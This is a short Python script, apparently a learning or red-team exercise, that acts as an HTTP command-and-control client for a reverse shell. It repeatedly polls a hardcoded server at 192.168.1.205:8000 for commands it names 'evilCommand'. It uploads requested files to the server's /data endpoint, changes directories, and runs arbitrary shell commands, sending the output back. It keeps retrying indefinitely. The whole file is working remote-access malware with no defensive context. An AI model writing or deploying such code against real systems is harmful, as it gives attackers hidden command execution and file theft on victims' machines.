#!/usr/bin/env python3

import requests
import subprocess
import os
import time

SERVER_IPADDR = "192.168.1.205"
PORT = "8000"
URL_STRING = "http://{}:{}".format(SERVER_IPADDR, PORT)

def web_client():
    while True:
        getResponse = requests.get(URL_STRING)
        evilCommand = getResponse.text

        if 'terminate' in evilCommand:
            return 1
            break
        
        elif 'get' in evilCommand:
            getString, filename = evilCommand.split("*")
            if os.path.exists(filename):
                url_toProcessFile = URL_STRING+"/data"
                data = b''
                with open(filename,'rb') as fileObject:
                    data = fileObject.read()

                fileObject = {"file": data}
                r = requests.post(url_toProcessFile,files=fileObject)
                
            else:
                postResponse = requests.post(URL_STRING,data="File Not Found")

        elif 'cd' in evilCommand:
            cdString,destinationPath = evilCommand.split("*")
            try:
                os.chdir(destinationPath)
                newDir = os.getcwd()
                r = requests.post(URL_STRING,data="cd to "+newDir)
                
            except Exception as error:
                r = requests.post(URL_STRING,data=error)
        
        else:
            shellObject = subprocess.Popen(evilCommand, shell=True, stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            postResponse = requests.post(URL_STRING,data=shellObject.stdout.read())
            postResponse = requests.post(URL_STRING,data=shellObject.stderr.read())

if __name__ == "__main__":
    while True:
        try:
          status = web_client()
          if status == 1:
              break
        except Exception:
            time.sleep(10)
